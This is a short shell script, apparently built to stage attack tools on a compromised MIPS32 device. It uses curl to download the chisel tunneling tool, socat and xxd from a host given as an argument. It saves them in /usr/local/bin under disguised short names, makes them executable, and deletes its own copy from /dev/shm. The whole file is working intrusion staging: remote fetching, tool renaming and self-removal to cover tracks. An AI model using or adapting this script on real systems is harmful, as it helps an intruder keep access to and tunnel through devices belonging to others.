#!/bin/sh

FILEPATH=/
OUT_PATH=/usr/local/bin
CHISEL_BIN=chisel-mips32
SOCAT_BIN=socat-mips32
XXD_BIN=xxd-mips32

CHISEL_OUT_BIN=ch32
SOCAT_OUT_BIN=so32
XXD_OUT_BIN=x32


mkdir -p ${OUT_PATH}
curl http://${1}:${2}/${FILEPATH}/${CHISEL_BIN} -o ${OUT_PATH}/ch32
curl http://${1}:${2}/${FILEPATH}/${SOCAT_BIN} -o ${OUT_PATH}/so32
curl http://${1}:${2}/${FILEPATH}/${XXD_BIN} -o ${OUT_PATH}/x32

chmod +x ${OUT_PATH}/${CHISEL_OUT_BIN}
chmod +x ${OUT_PATH}/${SOCAT_OUT_BIN}
chmod +x ${OUT_PATH}/${XXD_OUT_BIN}

rm /dev/shm/prep.sh





